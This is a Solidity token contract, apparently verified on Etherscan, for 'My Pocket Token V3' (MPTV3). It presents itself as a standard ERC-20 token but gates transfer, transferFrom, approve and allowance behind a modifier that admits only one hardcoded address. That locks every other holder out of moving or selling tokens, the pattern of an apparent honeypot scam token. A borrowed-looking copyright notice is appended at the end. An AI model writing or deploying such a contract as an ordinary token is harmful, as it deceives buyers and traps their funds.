/**
 *Submitted for verification at Etherscan.io on 2022-01-21
*/

//"SPDX-License-Identifier: MIT"

pragma solidity ^0.8.6;

contract MPTV3SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}

 contract MPTV3 is MPTV3SafeMath {
    string constant public name = "My Pocket Token V3";
    string constant public symbol = "MPTV3";
    uint8 constant public decimals = 18;
    uint256 constant public _totalSupply = 8000000000 * 10 ** 18;
    
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowed;

    constructor() {
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    
 modifier onlyBoss() {
        require(msg.sender == 0x01508A4A533463C88fcBdd0946Ff8FB4cf4E0623,  "You are not an Boss");
        _;
    }

    event Transfer(address indexed from, address indexed to, uint tokens); 
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens); 


    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) onlyBoss public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) onlyBoss public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }
    
    function increaseApproval(address spender, uint tokens) onlyBoss public returns (bool success) {
        allowed[msg.sender][spender] = safeAdd(allowed[msg.sender][spender], tokens);
        return true;
    }
    
    function decreaseApproval(address spender, uint tokens) onlyBoss public returns (bool success) {
        allowed[msg.sender][spender] = safeSub(allowed[msg.sender][spender], tokens);
        return true;
    }

    function transfer(address to, uint tokens) onlyBoss  public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) onlyBoss public returns (bool success) {
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
    }


 
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
    }
    
    /** 
* Copyright CENTRE SECZ 2018 
*
* Permission is hereby granted, free of charge, to any person obtaining a copy 
* of this software and associated documentation files (the "Software"), to deal 
* in the Software without restriction, including without limitation the rights 
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell 
* copies of the Software, and to permit persons to whom the Software is furnished to 
* do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all 
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR 
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE 
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
* WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN 
* CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/